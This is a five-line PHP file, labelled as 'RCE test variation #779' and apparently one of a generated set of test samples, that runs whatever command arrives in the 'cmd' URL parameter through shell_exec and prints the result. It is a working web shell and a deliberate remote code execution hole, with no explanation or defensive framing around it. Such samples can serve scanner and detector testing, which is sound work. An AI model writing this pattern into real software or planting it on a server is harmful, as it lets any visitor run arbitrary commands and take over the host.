<?php
// RCE test variation #779
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>